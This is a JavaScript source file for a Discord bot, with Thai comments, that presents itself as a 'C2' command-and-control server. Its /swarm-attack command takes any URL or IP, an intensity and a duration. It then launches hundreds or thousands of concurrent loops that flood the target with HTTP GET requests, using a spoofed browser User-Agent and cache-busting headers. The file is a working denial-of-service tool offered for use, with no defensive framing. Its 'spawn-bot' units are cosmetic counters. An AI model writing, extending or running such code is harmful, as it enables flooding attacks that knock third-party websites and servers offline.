const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const http = require('http');
const axios = require('axios');

const PORT = process.env.PORT || 3000;
let slaveNodes = [];

// HTTP Server พื้นฐาน
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('JARVIS C2 Power Engine is running smoothly.');
});

server.listen(PORT, () => {
    console.log(`[+] C2 Power Server running on port ${PORT}`);
});

// Discord Bot Setup
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('ready', async () => {
    console.log(`[+] C2 Discord Bot logged in as ${client.user.tag}`);
    
    const commands = [
        new SlashCommandBuilder()
            .setName('swarm-attack')
            .setDescription('สั่งการเซิร์ฟเวอร์ระเบิดพลังยิงถล่มเป้าหมายด้วยความเร็วสูง!')
            .addStringOption(option => option.setName('target').setDescription('URL หรือ IP เป้าหมายที่ต้องการถล่ม').setRequired(true))
            .addIntegerOption(option => option.setName('intensity').setDescription('ความรุนแรง (จำนวนเธรดจำลอง เช่น 100, 500, 1000)').setRequired(true))
            .addIntegerOption(option => option.setName('duration').setDescription('ระยะเวลาในการยิง (วินาที)').setRequired(true)),
        new SlashCommandBuilder()
            .setName('spawn-bot')
            .setDescription('เสกกองกำลังจำลองเข้าสู่ระบบ')
            .addIntegerOption(option => option.setName('count').setDescription('จำนวนกองกำลัง').setRequired(true)),
        new SlashCommandBuilder()
            .setName('nodes-status')
            .setDescription('ตรวจสอบสถานะกองกำลังในระบบ')
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
        console.log('[+] C2 Slash commands registered successfully.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'nodes-status') {
        return interaction.reply({ content: `[📊] สถานะระบบพลังงานปัจจุบัน:\n- กองกำลังเสมือนพร้อมใช้งาน: **${slaveNodes.length} ยูนิต**`, ephemeral: true });
    }

    if (interaction.commandName === 'spawn-bot') {
        const count = interaction.options.getInteger('count');
        for (let i = 0; i < count; i++) {
            slaveNodes.push({ id: 'unit_' + Math.random().toString(36).substring(7) });
        }
        return interaction.reply({ content: `[🤖⚡] เพิ่มกำลังพลเสมือนสำเร็จ **${count} ยูนิต**! รวมทั้งหมด: **${slaveNodes.length} ยูนิต**`, ephemeral: true });
    }

    if (interaction.commandName === 'swarm-attack') {
        const target = interaction.options.getString('target');
        const intensity = interaction.options.getInteger('intensity'); // จำนวนเธรดที่จะยิงพร้อมกัน
        const duration = interaction.options.getInteger('duration');

        const targetUrl = target.startsWith('http') ? target : `http://${target}`;

        await interaction.reply(`[🔥⚡] เริ่มปฏิบัติการถล่ม **${targetUrl}** ด้วยความเข้มข้น **${intensity} Threads** เป็นเวลา **${duration} วินาที** ลุยโลด!`);

        let isAttacking = true;
        
        // ตั้งเวลาหยุดยิงตาม Duration
        setTimeout(() => {
            isAttacking = false;
            console.log(`[+] สิ้นสุดภารกิจถล่มเป้าหมาย ${targetUrl}`);
        }, duration * 1000);

        // ฟังก์ชันยิงรัวๆ แบบ Concurrent High-Speed Loop
        const fireWorker = async () => {
            while (isAttacking) {
                try {
                    await axios.get(targetUrl, { 
                        timeout: 3000,
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Cache-Control': 'no-cache'
                        }
                    });
                } catch (e) {
                    // ป้องกัน Error หยุดลูป
                }
            }
        };

        // ปล่อยพลังยิงออกไปพร้อมกันตามจำนวน Intensity (เช่น 500 หรือ 1000 เธรดพร้อมกัน)
        for (let i = 0; i < intensity; i++) {
            fireWorker();
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
